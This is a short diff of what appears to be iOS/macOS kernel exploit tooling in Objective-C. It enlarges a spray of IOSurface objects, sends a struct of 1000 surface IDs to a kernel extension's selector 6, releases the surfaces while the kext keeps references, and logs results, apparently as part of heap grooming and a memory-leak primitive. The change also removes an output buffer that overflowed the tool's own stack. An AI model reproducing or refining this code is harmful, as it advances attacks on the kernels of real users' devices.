@@ -154,7 +154,7 @@ static BOOL p114_dlsym(void) {
    surfaces; the staging law's live-queue expected buffer = 0x4000
    (16384 B). Documents/p114_bankbytes.txt = decimal byte size per banked
    surface (clamped 4096..1048576); default stays 1024 (the old law).    */
-static NSInteger g_p114_bankbytes = 1024;
+static NSInteger g_p114_bankbytes = 16384;   /* staging law 0x4000 (the review: the old default starved the bank) */
 
 static p114_SurfaceRef p114_mk_surface_bytes(NSInteger bytes) {
     if (!g_p114_surfCreate) return NULL;
@@ -371,16 +371,14 @@ static void p114_hexdump(size_t maxn) {
         for (int ti = 0; ti < 1000; ti++)
             *(uint32_t *)(void *)(qBuf + 4 + ti * 4) = p114_sids[ti];  /* tags[i] */
         qBuf[0xFA4] = 0x01;                             /* the flag word bit0 */
-        size_t qOutLen = sizeof(qBuf);
-        uint64_t qOut[4] = {0};
-        kern_return_t krQ = g_p114_callStruct(g_p114_conn, 6, qBuf, qsz, qOut, &qOutLen);
-        g_p114_qh = qOut[0];
+        /* contract v7 row6: out = 0 — QueueCreate MUST be NULL,NULL (the
+           4008-into-32 stack overflow the sync-law review caught) */
+        kern_return_t krQ = g_p114_callStruct(g_p114_conn, 6, qBuf, qsz, NULL, NULL);
         g_p114_queued = YES;
         for (int i = 0; i < nbank && p114_bank[i]; i++)
             if (g_p114_surfRel) g_p114_surfRel(p114_bank[i]);   /* the kext holds its own refs */
-        Lf(@"[*] QueueCreate sel=6 stIn=0x%x (v5 contract: {1000, sids[1000], flags}) "
-           @"kr=0x%x outLen=%zu out0=%016llx (the {u64} input candidate)",
-           qsz, krQ, qOutLen, (unsigned long long)qOut[0]);
+        Lf(@"[*] QueueCreate sel=6 stIn=0x%x (contract v7: {1000, sids[1000], flags}, out=NULL,NULL) "
+           @"kr=0x%x", qsz, krQ);
         goto v5_after;
     v5_stop:
         L(@"[pairing note stays] p110's leakgate-on arm HOLDS honestly until this "
